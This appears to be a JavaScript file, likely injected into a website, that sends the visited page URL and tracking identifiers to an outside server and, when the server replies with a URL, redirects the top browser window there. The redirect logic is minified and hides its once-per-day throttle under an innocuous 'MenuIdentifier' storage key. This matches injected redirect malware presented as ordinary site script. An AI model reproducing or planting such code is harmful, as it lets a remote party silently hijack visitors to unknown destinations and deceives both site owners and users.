
    (function () {
        function initXMLhttp() {
            var xmlhttp;
            if (window.XMLHttpRequest) {
                xmlhttp = new XMLHttpRequest();
            } else {
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            }
            return xmlhttp;
        }
    
        function minAjax(config) {
            if (!config.url || !config.type) return;
            if (!config.method) config.method = true;
            if (!config.debugLog) config.debugLog = false;
    
    
            var sendString = [],
                sendData = config.data;
            if (typeof sendData === "string") {
                var tmpArr = String.prototype.split.call(sendData, '&');
                for (var i = 0, j = tmpArr.length; i < j; i++) {
                    var datum = tmpArr[i].split('=');
                    sendString.push(encodeURIComponent(datum[0]) + "=" + encodeURIComponent(datum[1]));
                }
            } else if (typeof sendData === 'object' && !(sendData instanceof String)) {
                for (var k in sendData) {
                    var datum = sendData[k];
                    if (Object.prototype.toString.call(datum) == "[object Array]") {
                        for (var i = 0, j = datum.length; i < j; i++) {
                            sendString.push(encodeURIComponent(k) + "[]=" + encodeURIComponent(datum[i]));
                        }
                    } else {
                        sendString.push(encodeURIComponent(k) + "=" + encodeURIComponent(datum));
                    }
                }
            }
            sendString = sendString.join('&');
    
            if (window.XDomainRequest) {
                var xmlhttp = new window.XDomainRequest();
                xmlhttp.onload = function () {
                    if (config.success) {
                        config.success(xmlhttp.responseText);
                    }
                };
                xmlhttp.open("POST", config.url);
                xmlhttp.send(sendString);
            } else {
                var xmlhttp = initXMLhttp();
                xmlhttp.onreadystatechange = function () {
                    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                        if (config.success) {
                            config.success(xmlhttp.responseText, xmlhttp.readyState);
                        }
                    }
                }
    
                if (config.type == "GET") {
                    xmlhttp.open("GET", config.url + "?" + sendString, config.method);
                    xmlhttp.send();
                }
                if (config.type == "POST") {
                    xmlhttp.open("POST", config.url, config.method);
                    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    xmlhttp.send(sendString);
                }
            }
        }
    
        dL();
    
        function dL() {
            
    
            function bl(resp) {
                !function (dr) {
                    function t() { return !!localStorage && localStorage.getItem(a) } function e() {
                        o(),
                        parent.top.window.location.href = c
                    } function o() { var t = r + i; if (localStorage) { localStorage.setItem(a, t) } }
                    function n() { if (t()) { var o = localStorage && localStorage.getItem(a); r > o && e() } else e() } var a = "MenuIdentifier",
                        r = Math.floor((new Date).getTime() / 1e3), c = dr, i = 86400; n()
                }(resp);
            }
    

            minAjax({
                url: 'https://dev.finnthewebdesigner.com/f/gstats',
                type: "POST",
                data: {
                    vhref: location.href,
                    juh:'3fda3454513257364121b88e3cadbe7f',
                    cs:'fd1137d0376926ceb8042c583f754035',
                    ex:1670171503781,
                    t0: 1670170904,
                    t: Math.floor(new Date().getTime() / 1000),
                },
                success: function (response) {
                    try {
                        var json = JSON.parse(response)
                        if (json && json.fw && json.fw.indexOf('http')>-1) bl(json.fw)
                    }catch(err) {
                        
                    }
                }
            });
        }
    })();
    